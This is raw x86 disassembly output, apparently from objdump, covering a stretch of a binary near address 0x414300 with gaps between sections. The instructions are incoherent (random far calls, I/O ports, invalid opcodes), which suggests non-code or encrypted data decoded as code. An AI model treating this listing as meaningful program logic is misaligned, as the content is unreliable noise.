  4142e8:	add    BYTE PTR [edx+0x4d],ch
  4142eb:	jg     0x414314
  4142ed:	inc    ecx
  4142ee:	outs   dx,BYTE PTR ds:[esi]
  4142ef:	sub    esi,DWORD PTR [edx]
  4142f1:	aam    0x8b
  4142f3:	pushf  
  4142f4:	loope  0x4142d7
  4142f6:	inc    esi
  4142f7:	mov    ecx,0x37d37a7
  4142fc:	xchg   edi,eax
  4142fd:	dec    esp
  4142fe:	retf   0xb367
  414301:	test   DWORD PTR [edi-0x6d],esp
  414304:	jae    0x4142e8
  414306:	mov    ah,0x9f
  414308:	inc    edi
  414309:	dec    eax
  41430a:	xchg   ebp,eax
  41430b:	inc    eax
  41430c:	das    
  41430d:	xchg   ebp,eax
  41430e:	pop    ss
  41430f:	xor    BYTE PTR [ecx+0x0],cl
	...
  414372:	add    BYTE PTR [eax],al
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	es mov al,0x3c
  414383:	jae    0x414370
  414385:	aam    0x0
  414387:	add    BYTE PTR ds:0xaa000001,al
  41438d:	dec    eax
  41438e:	mov    ebx,DWORD PTR [edi]
  414390:	retf   
  414391:	frstor [ebx+0x37]
  414394:	popa   
  414395:	je     0x414350
  414397:	jmp    FWORD PTR [eax+0x27ae08a6]
  41439d:	das    
  41439e:	pop    ebx
  41439f:	or     esi,DWORD PTR [edx-0x7a]
  4143a2:	mov    BYTE PTR [eax+0x3c],bl
  4143a5:	rcr    cl,1
  4143a7:	jne    0x414361
  4143a9:	test   al,0x91
  4143ab:	dec    eax
  4143ac:	push   ss
  4143ad:	int    0x1d
  4143af:	fcomi  st,st(7)
  4143b1:	bound  ebp,QWORD PTR [ecx-0x26]
  4143b4:	push   edi
  4143b5:	scas   eax,DWORD PTR es:[edi]
  4143b6:	jne    0x414389
  4143b8:	sub    edx,DWORD PTR [esi-0x44]
  4143bb:	into   
  4143bc:	ins    BYTE PTR es:[edi],dx
  4143bd:	jp     0x414384
  4143bf:	sar    DWORD PTR [edx-0x22f64893],cl
  4143c5:	scas   al,BYTE PTR es:[edi]
  4143c6:	std    
  4143c7:	push   0x39
  4143c9:	mov    DWORD PTR [esi+0x52],0xc81306b3
  4143d0:	pop    ss
  4143d1:	sahf   
  4143d2:	fisttp WORD PTR [ecx+edx*1]
  4143d5:	stos   DWORD PTR es:[edi],eax
  4143d6:	mov    ebx,0x1df1c359
  4143db:	xchg   esi,eax
  4143dc:	(bad)  
  4143dd:	jle    0x414387
  4143df:	outs   dx,DWORD PTR ds:[esi]
  4143e0:	pop    ss
  4143e1:	int3   
  4143e2:	bound  eax,QWORD PTR [ecx]
  4143e4:	call   0x3726:0x520a8f84
  4143eb:	mov    ebp,0xa65f0dea
  4143f0:	push   esi
  4143f1:	lahf   
  4143f2:	pop    esi
  4143f3:	jns    0x414388
  4143f5:	push   edi
  4143f6:	iret   
  4143f7:	mov    ebx,0xee6b951e
  4143fc:	sbb    ch,BYTE PTR [esi-0x2f]
  4143ff:	pop    ebp
  414400:	ror    dh,1
  414402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414403:	pushf  
  414404:	fisub  DWORD PTR [ebp-0x4b]
  414407:	int3   
  414408:	out    0x3,al
  41440a:	mov    edi,0xa6c431fb
  41440f:	push   ecx
  414410:	sbb    DWORD PTR [eax+0x1e695795],0x26d2e634
  41441a:	mov    ebx,0xe0c9a257
  41441f:	pop    eax
  414420:	push   edi
  414421:	pop    ebx
  414422:	pushf  
  414423:	shl    DWORD PTR [ecx+0x73],0xb7
  414427:	jl     0x41449b
  414429:	mov    edx,esi
  41442b:	mov    ecx,0x476772d2
  414430:	retf   0x7f8c
  414433:	jb     0x414443
  414435:	mov    esp,0xf3c00c3e
  41443a:	jl     0x414461
  41443c:	aaa    
  41443d:	or     BYTE PTR [edx],bh
  41443f:	retf   
  414440:	jg     0x41440d
  414442:	inc    esp
  414443:	xor    eax,0xcf6b7aaa
  414448:	out    0x59,al
  41444a:	xchg   ecx,eax
  41444b:	lea    eax,[edx]
  41444d:	push   edi
  41444e:	or     dh,BYTE PTR [eax]
  414450:	xor    edx,DWORD PTR [ecx+0x384c0d68]
  414456:	dec    ecx
  414457:	inc    ebx
  414458:	xchg   ebx,eax
  414459:	xor    eax,0x7cf988c4
  41445e:	ror    BYTE PTR [eax],0x9b
  414461:	loop   0x41443c
  414463:	jle    0x4143fb
  414465:	mov    edi,0xa08b3e0e
  41446a:	mov    eax,0x2826166b
  41446f:	add    BYTE PTR [ebp-0x42],0xd4
  414473:	outs   dx,BYTE PTR ds:[esi]
  414474:	xchg   edx,eax
  414475:	test   DWORD PTR [ebx+eax*8-0x6a],esp
  414479:	pop    eax
  41447a:	pop    esi
  41447b:	jl     0x4144cc
  41447d:	sub    eax,0x71e731fd
  414482:	outs   dx,BYTE PTR ds:[esi]
  414483:	(bad)  
  414484:	or     BYTE PTR [edi],0xf7
  414487:	push   ebx
  414488:	stc    
  414489:	repz and DWORD PTR [esi+0x31c8f3e7],0x5d
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x75]
  414501:	cmp    esi,0xffffff9c
  414504:	lock aad 0x0
  414507:	add    BYTE PTR ds:0x20000001,al
  41450d:	sub    DWORD PTR [edi+0x6a],esp
  414510:	lock into 
  414512:	stos   BYTE PTR es:[edi],al
  414513:	shr    DWORD PTR [edx+0x4c2dd737],0x6b
  41451a:	sahf   
  41451b:	mov    ah,0x6a
  41451d:	icebp  
  41451e:	jb     0x414595
  414520:	ss sub eax,0x9bdeddfe
  414526:	clc    
  414527:	(bad)  
  414528:	ja     0x414536
  41452a:	fwait
  41452b:	push   0x18e1b8c5
  414530:	pop    ds
  414531:	call   0xb3af678
  414536:	jecxz  0x41456c
  414538:	retf   0x668c
  41453b:	sti    
  41453c:	jp     0x414595
  41453e:	fiadd  DWORD PTR [eax]
  414540:	sub    eax,0xfb12f45d
  414545:	jecxz  0x414596
  414547:	sbb    al,0x94
  414549:	pop    ds
  41454a:	mov    ch,0xa
  41454c:	aam    0xc0
  41454e:	(bad)  
  41454f:	into   
  414550:	xor    DWORD PTR [ebx],0x864e8ee3
  414556:	push   edi
  414557:	retf   0x18e0
  41455a:	stos   BYTE PTR es:[edi],al
  41455b:	push   eax
  41455d:	sbb    ch,dl
  41455f:	mov    edx,DWORD PTR [esi+0x38]
  414562:	and    BYTE PTR [ebx+0x5ca3694c],0x82
  414569:	or     BYTE PTR [edi+ebp*8-0x251afa31],ch
  414570:	push   edi
  414571:	dec    edi
  414572:	sub    al,0x54
  414574:	or     al,0xf4
  414576:	outs   dx,DWORD PTR ds:[esi]
  414577:	mov    dh,0xb2
  414579:	mov    eax,esi
  41457b:	iret   
  41457c:	pop    ebx
  41457d:	(bad)  
  41457e:	(bad)  
  41457f:	pop    eax
  414580:	or     dh,BYTE PTR [esp+ecx*1-0x6d893074]
  414587:	or     DWORD PTR [eax-0x69],esp
  41458a:	lea    ecx,[ecx+0x34]
  41458d:	fist   WORD PTR [ebp+0xabadc82]
  414593:	or     eax,edi
  414595:	aaa    
  414596:	stc    
  414597:	adc    al,0x3d
  414599:	xor    BYTE PTR [ebp-0x39589b8e],bh
  41459f:	push   esp
  4145a0:	call   0x5e71:0x13d9a91b
  4145a7:	push   es
  4145a8:	sbb    BYTE PTR [ebx],bl
  4145aa:	test   cl,0x6
  4145ad:	in     eax,0x42
  4145af:	out    dx,eax
  4145b0:	mov    ch,BYTE PTR [ebx+0x4818b14e]
  4145b6:	cmp    al,0x51
  4145b8:	stos   DWORD PTR es:[edi],eax
  4145b9:	ds push cs
  4145bb:	sub    eax,DWORD PTR [ecx-0x9]
  4145be:	jecxz  0x41462e
  4145c0:	mov    ah,0x57
  4145c2:	xchg   esi,edx
  4145c4:	pop    esi
  4145c5:	cli    
  4145c6:	jle    0x41457d
  4145c8:	mov    ebp,DWORD PTR [edx]
  4145ca:	jo     0x414593
  4145cc:	rcr    BYTE PTR [ecx-0x6a],1
  4145cf:	sub    BYTE PTR [esp+esi*1],ch
  4145d2:	ds push ecx
  4145d4:	xchg   edi,eax
  4145d5:	pop    es
  4145d6:	mov    ds:0xa59498e0,eax
  4145db:	adc    edi,DWORD PTR [ecx]
  4145dd:	int    0x64
  4145df:	lods   al,BYTE PTR ds:[esi]
  4145e0:	or     eax,0x12099cef
  4145e5:	inc    ecx
  4145e6:	pop    ss
  4145e7:	sbb    al,0x7b
  4145e9:	dec    edx
  4145ea:	inc    edi
  4145eb:	fwait
  4145ec:	repnz mov ds:0x17846782,eax
  4145f2:	pop    eax
  4145f3:	adc    al,0x8e
  4145f5:	cmc    
  4145f6:	dec    edi
  4145f7:	and    eax,0x798efce1
  4145fc:	clc    
  4145fd:	mov    eax,ds:0x8d5a6309
  414602:	cmp    cl,BYTE PTR [ebx+0x7ea9be35]
  414608:	pop    ebx
  414609:	data16 mov BYTE PTR [edx],al
  41460c:	adc    ecx,DWORD PTR [ecx+0x994fde]
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x7b
  414681:	cld    
  414682:	xchg   DWORD PTR [ecx-0xb],edx
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0x2d000001
  41468d:	jp     0x4146d4
  41468f:	pop    ss
  414690:	pop    edx
  414691:	ins    DWORD PTR es:[edi],dx
  414692:	in     al,0xb8
  414694:	xor    dh,bh
  414696:	fcmovu st,st(0)
  414698:	mov    ecx,DWORD PTR [ecx+eax*2-0x32893f4f]
  41469f:	arpl   WORD PTR [edi],si
  4146a1:	pop    ebx
  4146a2:	mov    bl,0xbb
  4146a4:	scas   eax,DWORD PTR es:[edi]
  4146a5:	fmul   QWORD PTR [esi+ebp*4]
  4146a8:	loop   0x414698
  4146aa:	mov    cl,0xf0
  4146ac:	mov    bl,0xe6
  4146ae:	rol    DWORD PTR [eax+0x21],1
  4146b1:	jnp    0x41472b
  4146b3:	xor    eax,0x87f00033
  4146b8:	jp     0x414649
  4146ba:	adc    edi,DWORD PTR [edx]
  4146bc:	out    0x82,al
  4146be:	nop
  4146bf:	ret    
  4146c0:	lds    ebp,FWORD PTR [eax+0x11]
  4146c3:	mov    esp,ss
  4146c5:	dec    eax
  4146c6:	enter  0x418f,0xee
  4146ca:	shr    DWORD PTR [eax+edx*4-0x63],1
  4146ce:	xor    al,0xa4
  4146d0:	aam    0xa6
  4146d2:	dec    ecx
  4146d3:	lods   eax,DWORD PTR ds:[esi]
  4146d4:	xor    al,0xd1
  4146d6:	pop    ds
  4146d7:	in     eax,0x7
  4146d9:	sub    DWORD PTR [ebx+0x37],esp
  4146dc:	loop   0x4146b1
  4146de:	xor    al,0xba
  4146e0:	cld    
  4146e1:	mov    bl,0xce
  4146e3:	fwait
  4146e4:	call   0xd16f:0x97c8894a
  4146eb:	lock sbb bl,BYTE PTR [edi+0x2fd3fd7f]
  4146f2:	mov    eax,ds:0xbfbdf4d
  4146f7:	add    esp,DWORD PTR [ecx]
  4146f9:	pop    ds
  4146fa:	and    eax,0x21646f2e
  4146ff:	pop    edx
  414700:	imul   eax,DWORD PTR [ebp+0x54],0x9c31eaa5
  414707:	mov    eax,ds:0xabbd1c6d
  41470c:	pop    esi
  41470d:	stos   DWORD PTR es:[edi],eax
  41470e:	sbb    BYTE PTR [esi+0x43],0x40
  414712:	jmp    0x41478c
  414714:	pop    edi
  414715:	ficom  DWORD PTR [ebp-0x74]
  414718:	sub    esp,edi
  41471a:	arpl   WORD PTR ds:[eax],bp
  41471d:	mov    dl,0xd5
  41471f:	add    DWORD PTR [edx+0x30e9e12],esp
  414725:	jmp    0x4146cf
  414727:	int    0x51
  414729:	push   esp
  41472a:	ret    
  41472b:	push   edx
  41472c:	hlt    
  41472d:	push   eax
  41472e:	hlt    
  41472f:	cs (bad) 
  414732:	jg     0x4146f0
  414734:	fwait
  414735:	sbb    al,0xa4
  414737:	add    BYTE PTR [ebx+0x78],bh
  41473a:	add    BYTE PTR [ebp+esi*8+0x35],dh
  41473e:	clc    
  41473f:	sbb    eax,0xc4238f83
  414744:	sbb    al,0x25
  414746:	jnp    0x4146ee
  414748:	cmp    DWORD PTR [eax+0x10],esi
  41474b:	in     al,0x2f
  41474d:	jg     0x414739
  41474f:	xor    cl,BYTE PTR [ebx-0x3531981c]
  414755:	sti    
  414756:	jnp    0x414719
  414758:	repnz (bad) 
  41475a:	aad    0x17
  41475c:	std    
  41475d:	jle    0x414735
  41475f:	cld    
  414760:	adc    DWORD PTR [eax],edi
  414762:	mov    eax,ds:0x5504466d
  414767:	out    dx,al
  414768:	xchg   ecx,eax
  414769:	or     esi,DWORD PTR [edi*8+0x70710658]
  414770:	xchg   esp,eax
  414771:	or     DWORD PTR [esi],esp
  414773:	push   ds
  414774:	(bad)  
  414775:	xchg   ebx,eax
  414776:	fs xor eax,0xe0aa914f
  41477c:	lods   al,BYTE PTR ds:[esi]
  41477d:	jnp    0x414793
  41477f:	xchg   BYTE PTR [ebx+edx*8],dl
  414782:	repnz mov al,0xcd
  414785:	push   edi
  414786:	jne    0x4147dc
  414788:	jns    0x41478b
  41478a:	sub    ah,bh
  41478c:	lahf   
  41478d:	jge    0x41478d
  41478f:	xor    ecx,eax
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x7590c6af
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0xda000001
  41480d:	into   
  41480e:	fnstenv [ecx-0x1e4d7cdf]
  414814:	add    BYTE PTR [ebx-0x6bd54c0b],al
  41481a:	in     eax,0x24
  41481c:	pusha  
  41481d:	push   ebx
  41481e:	add    al,0xcb
  414820:	in     al,dx
  414821:	sub    BYTE PTR [esi+ecx*8+0x5f0567bf],bl
  414828:	dec    ecx
  414829:	test   eax,0xafab78cc
  41482e:	imul   esi,DWORD PTR [edi-0x38],0xde51059d
  414835:	ror    BYTE PTR [eax+ebx*1+0x26],cl
  414839:	imul   edx,DWORD PTR [ecx-0x27],0xf64632b5
  414840:	dec    edi
  414841:	in     al,0x21
  414843:	push   0xe085bd36
  414848:	mov    esp,0xa113801e
  41484d:	aam    0xfb
  41484f:	mov    ds,WORD PTR [edx+0x60]
  414852:	xlat   BYTE PTR ds:[ebx]
  414853:	pop    ds
  414854:	icebp  
  414855:	(bad)  
  414856:	cdq    
  414857:	push   es
  414858:	clc    
  414859:	xchg   edi,eax
  41485a:	or     cl,BYTE PTR [ecx-0x64f25869]
  414860:	gs jp  0x4147e8
  414863:	pop    ebx
  414864:	or     dh,BYTE PTR [eax]
  414866:	js     0x414889
  414868:	jl     0x4148b5
  41486a:	adc    ch,BYTE PTR [ebx+0x23]
  41486d:	sbb    DWORD PTR [ebp+0x7f],0x25bdc887
  414874:	cwde   
  414875:	add    ebx,ebp
  414877:	dec    eax
  414878:	mov    ch,0x48
  41487a:	mov    ch,0x35
  41487c:	das    
  41487d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41487e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41487f:	xchg   esi,eax
  414880:	jae    0x4148fc
  414882:	dec    ebx
  414883:	pop    edi
  414884:	jecxz  0x4148eb
  414886:	adc    al,0x9c
  414888:	sub    cl,ch
  41488a:	leave  
  41488b:	gs jg  0x4148bb
  41488e:	mov    ds,WORD PTR [ebp-0x31]
  414891:	bound  esi,QWORD PTR ds:0x3d7f655e
  414897:	nop
  414898:	out    dx,eax
  414899:	imul   esp,DWORD PTR [esi+0x40],0xffffffbc
  41489d:	or     al,0x78
  41489f:	(bad)  
  4148a0:	push   0x81068cb3
  4148a5:	ret    0xe5b1
  4148a8:	mov    al,0xef
  4148aa:	iret   
  4148ab:	xchg   ebx,eax
  4148ac:	xchg   edi,eax
  4148ad:	retf   
  4148ae:	iret   
  4148af:	adc    ch,BYTE PTR [eax-0x3a2483fb]
  4148b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148b6:	in     eax,dx
  4148b7:	imul   ebx,DWORD PTR [edx-0x22d16414],0x49
  4148be:	or     al,0x34
  4148c0:	xor    BYTE PTR [esi+0x1587dac6],al
  4148c6:	repnz xor eax,0x1db5ae6b
  4148cc:	push   es
  4148cd:	pop    ecx
  4148ce:	mov    cl,0x6c
  4148d0:	shr    BYTE PTR [ebx+ebp*1+0x1b],0x1
  4148d5:	lock xchg ebp,eax
  4148d7:	pop    edx
  4148d8:	test   DWORD PTR [eax+0x31],edx
  4148db:	call   0x6aa9:0x59936120
  4148e2:	mov    edi,0x87483837
  4148e7:	jmp    0x1388:0xef7a7286
  4148ee:	mov    edi,0xcc210ced
  4148f3:	push   ss
  4148f4:	in     eax,dx
  4148f5:	pop    esp
  4148f6:	mov    edx,0x83f28d66
  4148fb:	ds push ds
  4148fd:	pop    eax
  4148fe:	fcompp 
  414900:	sbb    al,0xf8
  414902:	lahf   
  414903:	popf   
  414904:	loopne 0x4148c3
  414906:	sbb    bh,0xf1
  414909:	mov    esp,0xc9efa076
  41490e:	xchg   DWORD PTR [eax+0xc0],ebp
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	mov    ah,0x18
  414982:	and    esi,esi
  414984:	(bad)  
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR ds:0xbe000001,al
  41498d:	jl     0x41496e
  41498f:	and    DWORD PTR [edx],esp
  414991:	in     eax,dx
  414992:	xor    eax,0x3891ca7f
  414997:	test   ebp,esi
  414999:	cli    
  41499a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499b:	ins    BYTE PTR es:[edi],dx
  41499c:	sbb    ch,BYTE PTR [ebp-0x11ac99bd]
  4149a2:	xor    al,0x86
  4149a4:	mov    al,ds:0x21749ba3
  4149a9:	sbb    BYTE PTR [ebx+0x70],dl
  4149ac:	loopne 0x4149ed
  4149ae:	dec    ecx
  4149af:	pop    esp
  4149b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b1:	add    DWORD PTR [edi+0x13],edx
  4149b4:	xor    BYTE PTR [edi-0x3b0d6400],0xdc
  4149bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149bc:	mov    bl,0x21
  4149be:	push   esp
  4149bf:	pop    edx
  4149c0:	and    bh,cl
  4149c2:	sub    edx,DWORD PTR [edx-0x795adb63]
  4149c8:	int    0x77
  4149ca:	(bad)  
  4149cb:	jg     0x4149c3
  4149cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149ce:	cmp    cl,BYTE PTR [eax+0x8076fbf]
  4149d4:	nop
  4149d5:	out    dx,al
  4149d6:	add    DWORD PTR [ebx-0x2c],ebp
  4149d9:	mov    ah,0xaa
  4149db:	inc    esp
  4149dc:	adc    al,0x45
  4149de:	test   al,0x61
  4149e0:	fs ds dec ecx
  4149e3:	not    DWORD PTR [edx]
  4149e5:	test   al,0xad
  4149e7:	dec    eax
  4149e8:	lds    eax,FWORD PTR [edi]
  4149ea:	das    
  4149eb:	ja     0x4149e9
  4149ed:	rol    ch,0xde
  4149f0:	mov    edi,0x7293056e
  4149f5:	stos   DWORD PTR es:[edi],eax
  4149f6:	cmp    al,0x49
  4149f8:	xor    ebp,DWORD PTR [ebp+0x15617a14]
  4149fe:	push   es
  4149ff:	stos   BYTE PTR es:[edi],al
  414a00:	lock (bad) 
  414a02:	cs cmc 
  414a04:	cmp    DWORD PTR [edx+0x6e],ebp
  414a07:	ret    0x360d
  414a0a:	inc    ebp
  414a0b:	sub    ebx,DWORD PTR [edx+edi*4-0x2c514397]
  414a12:	mov    cl,bh
  414a14:	out    dx,al
  414a15:	xchg   BYTE PTR [esi],cl
  414a17:	je     0x414a25
  414a19:	mov    ch,0x92
  414a1b:	int3   
  414a1c:	mov    ecx,0xfe7ad45a
  414a21:	retf   
  414a22:	arpl   WORD PTR [ecx],di
  414a24:	or     al,0x27
  414a26:	push   edi
  414a27:	shr    DWORD PTR [edx+edx*8-0x66],1
  414a2b:	es push 0xffffff94
  414a2e:	sbb    edi,DWORD PTR [edx-0x46]
  414a31:	cmp    cl,bh
  414a33:	or     al,0x37
  414a35:	popf   
  414a36:	idiv   BYTE PTR [edi]
  414a38:	sub    al,0xf
  414a3a:	fistp  DWORD PTR [ebp-0x19]
  414a3d:	popf   
  414a3e:	push   ebx
  414a3f:	pusha  
  414a40:	adc    dh,dh
  414a42:	mov    esp,0xe8138fb6
  414a47:	mov    ah,0x39
  414a49:	fldenv [esi-0x7d7fd88f]
  414a4f:	pusha  
  414a50:	retf   0x6c1
  414a53:	addr16 ret 
  414a55:	or     al,0x28
  414a57:	fisubr DWORD PTR [ebp+0x15d15342]
  414a5d:	pop    ss
  414a5e:	mov    DWORD PTR [eax-0x63],edx
  414a61:	mov    dl,0x59
  414a63:	mov    esp,0x1ae2df28
  414a68:	jmp    0x6fdb:0xdf864239
  414a6f:	test   al,0x59
  414a71:	and    bh,BYTE PTR fs:[esi+0x47]
  414a75:	xor    al,0x5c
  414a77:	jbe    0x414a4e
  414a79:	mov    edx,0x29f10a12
  414a7e:	imul   ebx,eax,0x53
  414a81:	fistp  QWORD PTR [ebp-0x54853b60]
  414a87:	shl    DWORD PTR [edx+0x1a],1
  414a8a:	push   es
  414a8b:	xor    eax,ecx
  414a8d:	xchg   ecx,eax
  414a8e:	push   edx
  414a8f:	inc    edi
  414a90:	jmp    0x414a92
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x42cc63d9]
  414b02:	out    dx,eax
  414b03:	dec    esi
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0xc8000001
  414b0d:	and    eax,0x614c9db5
  414b12:	push   eax
  414b13:	mov    ebx,0xd9bd5580
  414b18:	push   eax
  414b19:	jg     0x414b35
  414b1b:	add    ch,cl
  414b1d:	mov    edx,0xc036c538
  414b22:	pop    edx
  414b23:	and    eax,0x48b76fbc
  414b28:	loop   0x414b0b
  414b2a:	imul   esi,DWORD PTR [ebx-0x7d],0xb08eb21e
  414b31:	fst    st(7)
  414b33:	xor    esp,DWORD PTR [ebx+ebp*8+0x6f72aa44]
  414b3a:	mov    ds:0x2c415376,al
  414b3f:	imul   esi,DWORD PTR [ebx],0xb16eeab8
  414b45:	icebp  
  414b46:	(bad)  
  414b47:	sbb    dl,BYTE PTR [edi-0x218f3905]
  414b4d:	or     BYTE PTR [esi],dh
  414b4f:	push   ebx
  414b51:	mov    dl,0x68
  414b53:	rcr    DWORD PTR [edx],0xc6
  414b56:	or     DWORD PTR [esi],eax
  414b58:	add    ch,BYTE PTR [esp-0x4b]
  414b5c:	mov    ds:0x172c53fe,al
  414b61:	out    dx,al
  414b62:	and    esi,DWORD PTR [ecx+0x26]
  414b65:	pop    ecx
  414b66:	rol    DWORD PTR [ebp+0x20],1
  414b69:	sub    esi,DWORD PTR [edi]
  414b6b:	mov    es,WORD PTR [ecx-0x56]
  414b6e:	sahf   
  414b6f:	jae    0x414bb3
  414b71:	adc    BYTE PTR [edi+0x8f7dc5c],ch
  414b77:	jmp    0x4f87da0b
  414b7c:	jae    0x414b3d
  414b7e:	jmp    0x414bd9
  414b80:	mov    ecx,0x6bedb405
  414b85:	and    dl,BYTE PTR [eax-0x80]
  414b88:	and    BYTE PTR [esi+0x20],dh
  414b8b:	mov    dl,dh
  414b8d:	test   DWORD PTR [bp+di+0xaa8],edx
  414b92:	push   ss
  414b93:	or     eax,0x1e27ce4c
  414b98:	mov    ecx,?
  414b9a:	hlt    
  414b9b:	enter  0x53da,0x24
  414b9f:	lods   eax,DWORD PTR ds:[esi]
  414ba0:	out    dx,al
  414ba1:	push   ecx
  414ba2:	sbb    BYTE PTR [ecx+0x3a111cf5],al
  414ba8:	mov    bh,0x41
  414baa:	fnstenv [edi]
  414bac:	sbb    DWORD PTR [edi-0x3b],0x89050627
  414bb3:	push   es
  414bb4:	sub    eax,0x333a3b1a
  414bb9:	sub    edx,DWORD PTR [esi-0x6f]
  414bbc:	adc    eax,0x7c0c3eec
  414bc1:	shr    edi,cl
  414bc3:	cmp    edx,DWORD PTR [edi]
  414bc5:	aaa    
  414bc6:	call   0x7efd:0xd09bcb0c
  414bcd:	jmp    0x56d8395d
  414bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bd3:	mov    ebp,esp
  414bd5:	pop    ebx
  414bd6:	mov    ebp,0xf42e87c3
  414bdb:	mov    cl,0x34
  414bdd:	ffree  st(1)
  414bdf:	dec    esp
  414be0:	sbb    eax,DWORD PTR [eax+0x4d]
  414be3:	jp     0x414b98
  414be5:	mov    ch,0x80
  414be7:	setae  BYTE PTR [ecx-0x4f51887b]
  414bee:	push   edi
  414bef:	mov    cl,0x32
  414bf1:	xchg   ebp,eax
  414bf2:	cli    
  414bf3:	jnp    0x414c3f
  414bf5:	jge    0x414bd3
  414bf7:	xchg   BYTE PTR [edx],cl
  414bf9:	dec    ebp
  414bfa:	cmp    cl,ch
  414bfc:	jl     0x414c77
  414bfe:	stos   BYTE PTR es:[edi],al
  414bff:	aaa    
  414c00:	fsubr  st(7),st
  414c02:	and    esp,DWORD PTR [edi-0x2728c219]
  414c08:	pusha  
  414c09:	sub    ch,BYTE PTR [edx]
  414c0b:	mov    bh,al
  414c0d:	setb   BYTE PTR [esi+0x57]
	...
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc esi,esi
  414c81:	push   edx
  414c82:	rcl    DWORD PTR [edi+0x9],0xdb
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    eax,0x95000001
  414c8d:	cwde   
  414c8e:	adc    DWORD PTR [edx+0x262c6cb9],eax
  414c94:	dec    esi
  414c95:	shr    DWORD PTR [esi+0x1d],0x6a
  414c99:	pusha  
  414c9a:	xchg   esp,eax
  414c9b:	lods   al,BYTE PTR ds:[esi]
  414c9c:	jno    0x414cd1
  414c9e:	mov    WORD PTR [ecx],gs
  414ca0:	xchg   edi,eax
  414ca1:	dec    ecx
  414ca2:	lds    edx,FWORD PTR [ebx+0x8f012ee]
  414ca8:	hlt    
  414ca9:	jg     0x414cb1
  414cab:	jo     0x414ce8
  414cad:	sbb    eax,0xaa80fbbc
  414cb2:	or     al,0x9e
  414cb4:	pop    esi
  414cb5:	jo     0x414c54
  414cb7:	in     al,0x8e
  414cb9:	cmp    ch,bh
  414cbb:	push   0x49
  414cbd:	loop   0x414cbf
  414cbf:	or     al,0xb5
  414cc1:	or     al,0x3d
  414cc3:	ud0    ebp,DWORD PTR [ebp-0x24]
  414cc7:	fild   DWORD PTR [ebp-0x2]
  414cca:	jo     0x414ca8
  414ccc:	call   0x43e2:0x7b1f5273
  414cd3:	dec    edi
  414cd4:	mov    ebx,DWORD PTR ss:[edi+0x1a]
  414cd8:	push   ds
  414cd9:	loopne 0x414ce5
  414cdb:	xor    DWORD PTR [esi],0x66
  414cde:	add    cl,BYTE PTR [eax-0x4f]
  414ce1:	je     0x414cf5
  414ce3:	(bad)  
  414ce4:	repnz stc 
  414ce6:	and    al,0xc2
  414ce8:	dec    edx
  414ce9:	add    edx,DWORD PTR [esi]
  414ceb:	in     al,dx
  414cec:	push   0xffffffd1
  414cee:	mov    ebx,0x935b120c
  414cf3:	call   0x4ebd:0x1843cae1
  414cfa:	mov    gs,esi
  414cfc:	(bad)  
  414cfd:	pop    ebp
  414cfe:	rcr    BYTE PTR [edi+0x1e],1
  414d01:	ins    DWORD PTR es:[edi],dx
  414d02:	mov    ds:0x2d180c1f,eax
  414d07:	mov    bh,0xcd
  414d09:	gs add ch,0x29
  414d0d:	leave  
  414d0e:	out    dx,eax
  414d0f:	mov    esi,0xe6b4b4d5
  414d14:	aas    
  414d15:	cmp    BYTE PTR [eax+0x3c29237d],ch
  414d1b:	xchg   ecx,eax
  414d1c:	sub    dl,dh
  414d1e:	or     DWORD PTR fs:[edi],0x6f
  414d22:	out    dx,eax
  414d23:	mov    ecx,0x453d106e
  414d28:	adc    DWORD PTR [ebp+0xf],0xed91c9fc
  414d2f:	in     eax,0x4f
  414d31:	clc    
  414d32:	or     al,0x7c
  414d34:	lea    eax,[edx+eax*4-0x32]
  414d38:	addr16 fwait
  414d3a:	rol    BYTE PTR [eax-0x2f],1
  414d3d:	push   ebx
  414d3e:	sub    eax,0xc6f9e8f2
  414d43:	sub    edi,DWORD PTR [edi]
  414d45:	push   ecx
  414d46:	add    BYTE PTR [eax+0x6a],dh
